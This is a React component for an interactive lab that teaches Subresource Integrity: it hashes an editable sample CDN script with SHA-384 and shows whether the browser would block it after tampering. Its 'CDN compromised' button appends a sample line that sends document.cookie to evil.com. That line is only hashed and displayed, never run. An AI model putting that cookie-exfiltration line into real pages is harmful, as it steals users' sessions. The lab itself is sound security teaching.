import { useEffect, useState } from 'react';
import { LabFrame, SecStyles, Verdict, tr, type L, type Lang } from './ui';

/**
 * Edit the "CDN file" and watch its real SHA-384 hash change (Web Crypto).
 * With integrity on, any mismatch means the browser refuses to run it.
 */

const ORIGINAL = `/* lib.js v2.1.0 */
export function formatPrice(n) {
  return '$' + n.toFixed(2);
}`;
const INJECT = `\nfetch('https://evil.com/c?k=' + document.cookie);`;

const T: Record<string, L> = {
  title: { zh: 'SRI 雜湊比對', en: 'SRI hash check', de: 'SRI-Hash-Prüfung' },
  hint: {
    zh: '這是放在 CDN 上的 lib.js。按「CDN 被入侵」或直接改一個字，看看雜湊值怎麼變、瀏覽器怎麼反應。',
    en: 'This is lib.js on a CDN. Hit "CDN compromised" or change a single character, and watch the hash and the browser react.',
    de: 'Das ist lib.js auf einem CDN. Klick „CDN kompromittiert" oder ändere ein Zeichen und beobachte Hash und Browser.',
  },
  file: { zh: 'CDN 上的 lib.js（可以直接編輯）', en: 'lib.js on the CDN (editable)', de: 'lib.js auf dem CDN (editierbar)' },
  hack: { zh: '💥 CDN 被入侵', en: '💥 CDN compromised', de: '💥 CDN kompromittiert' },
  restore: { zh: '↻ 還原', en: '↻ Restore', de: '↻ Wiederherstellen' },
  useSri: { zh: '<script> 加上 integrity 屬性', en: 'Add integrity to the <script>', de: 'integrity am <script> setzen' },
  expected: { zh: 'integrity（部署時算好）', en: 'integrity (computed at deploy)', de: 'integrity (beim Deploy berechnet)' },
  actual: { zh: '瀏覽器現在算出的', en: 'What the browser computes now', de: 'Was der Browser jetzt berechnet' },
  match: { zh: '✓ 雜湊值相符，檔案沒被動過，正常執行。', en: '✓ Hashes match. The file is untouched and runs.', de: '✓ Hashes stimmen. Die Datei ist unverändert und läuft.' },
  blocked: {
    zh: '✓ 雜湊值不符，瀏覽器拒絕執行這個檔案。被竄改的程式碼一行都沒跑。',
    en: '✓ Hash mismatch. The browser refuses to run the file; not one line of the tampered code executes.',
    de: '✓ Hash passt nicht. Der Browser führt die Datei nicht aus, keine Zeile des manipulierten Codes läuft.',
  },
  ran: {
    zh: '✗ 沒有 integrity，瀏覽器不比對內容，被竄改的檔案照樣執行。',
    en: "✗ Without integrity the browser doesn't compare anything, and the tampered file runs.",
    de: '✗ Ohne integrity vergleicht der Browser nichts, die manipulierte Datei läuft.',
  },
  same: { zh: '檔案沒被改過，不管有沒有 SRI 都會正常執行。', en: 'The file is unchanged, so it runs either way.', de: 'Die Datei ist unverändert und läuft so oder so.' },
  noCrypto: { zh: '這個瀏覽器不支援 Web Crypto。', en: 'Web Crypto is not available in this browser.', de: 'Web Crypto ist hier nicht verfügbar.' },
};

async function sha384(text: string) {
  const buf = await crypto.subtle.digest('SHA-384', new TextEncoder().encode(text));
  let bin = '';
  new Uint8Array(buf).forEach((b) => (bin += String.fromCharCode(b)));
  return 'sha384-' + btoa(bin);
}

function DiffHash({ a, b }: { a: string; b: string }) {
  return (
    <>
      {b.split('').map((ch, i) => (
        <span key={i} className={ch !== a[i] ? 'bg-[#FF6A2B] text-[#2A1208]' : ''}>
          {ch}
        </span>
      ))}
    </>
  );
}

export default function SriLab({ lang = 'en' }: { lang?: Lang }) {
  const [code, setCode] = useState(ORIGINAL);
  const [useSri, setUseSri] = useState(true);
  const [expected, setExpected] = useState<string | null>(null);
  const [actual, setActual] = useState<string | null>(null);
  const [supported, setSupported] = useState(true);

  useEffect(() => {
    if (typeof crypto === 'undefined' || !crypto.subtle) return setSupported(false);
    sha384(ORIGINAL).then(setExpected);
  }, []);

  useEffect(() => {
    if (typeof crypto === 'undefined' || !crypto.subtle) return;
    let alive = true;
    sha384(code).then((h) => alive && setActual(h));
    return () => {
      alive = false;
    };
  }, [code]);

  const ready = expected && actual;
  const same = ready && expected === actual;
  const result = !ready ? null : same ? (useSri ? 'match' : 'same') : useSri ? 'blocked' : 'ran';

  return (
    <LabFrame lang={lang} title={tr(T.title, lang)} hint={tr(T.hint, lang)} testId="lab-sri">
      <SecStyles />
      <div className="mb-1 flex flex-wrap items-center justify-between gap-2">
        <span className="text-xs font-extrabold uppercase tracking-[0.06em]">{tr(T.file, lang)}</span>
        <div className="flex gap-1.5">
          <button
            type="button"
            onClick={() => setCode((c) => (c.includes(INJECT) ? c : c + INJECT))}
            data-testid="sri-hack"
            className="border-2 border-[#2E382E] bg-[#FF6A2B] px-2.5 py-1 text-xs font-extrabold text-[#2A1208]"
          >
            {tr(T.hack, lang)}
          </button>
          <button type="button" onClick={() => setCode(ORIGINAL)} className="border-2 border-[#2E382E] bg-white px-2.5 py-1 text-xs font-extrabold">
            {tr(T.restore, lang)}
          </button>
        </div>
      </div>
      <textarea
        aria-label="lib.js"
        data-testid="sri-code"
        value={code}
        maxLength={2000}
        onChange={(e) => setCode(e.target.value)}
        rows={6}
        spellCheck={false}
        className="w-full resize-y border-2 border-[#2E382E] bg-[#2A332A] p-2 font-mono text-[12.5px] leading-relaxed text-[#EEF1E6] focus:outline-none focus:ring-2 focus:ring-[#DDFF00]"
      />

      <label className="mt-2 flex items-center gap-2 text-xs font-bold">
        <input type="checkbox" checked={useSri} onChange={(e) => setUseSri(e.target.checked)} data-testid="sri-toggle" className="h-4 w-4 accent-[#9DB800]" />
        🛡 {tr(T.useSri, lang)}
      </label>

      {!supported ? (
        <div className="mt-3 text-sm">{tr(T.noCrypto, lang)}</div>
      ) : (
        <div className="mt-3 space-y-1.5 font-mono text-[11.5px]">
          <div className={'border-2 p-2 ' + (useSri ? 'border-[#9DB800] bg-[#F3F9CF]' : 'border-dashed border-[#B9BAB6] bg-[#F4F4F1] opacity-60')}>
            <div className="mb-0.5 font-sans text-[10px] font-extrabold uppercase tracking-[0.08em]">{tr(T.expected, lang)}</div>
            <div className="break-all">{expected ?? '…'}</div>
          </div>
          <div className={'border-2 p-2 ' + (same ? 'border-[#9DB800] bg-white' : 'border-[#FF6A2B] bg-white')}>
            <div className="mb-0.5 font-sans text-[10px] font-extrabold uppercase tracking-[0.08em]">{tr(T.actual, lang)}</div>
            <div className="break-all" data-testid="sri-actual">
              {expected && actual ? <DiffHash a={expected} b={actual} /> : '…'}
            </div>
          </div>
        </div>
      )}

      {result && (
        <div key={result} className="mt-3" data-testid="sri-verdict" data-result={result}>
          <Verdict tone={result === 'ran' ? 'bad' : 'good'}>{tr(T[result], lang)}</Verdict>
        </div>
      )}
    </LabFrame>
  );
}
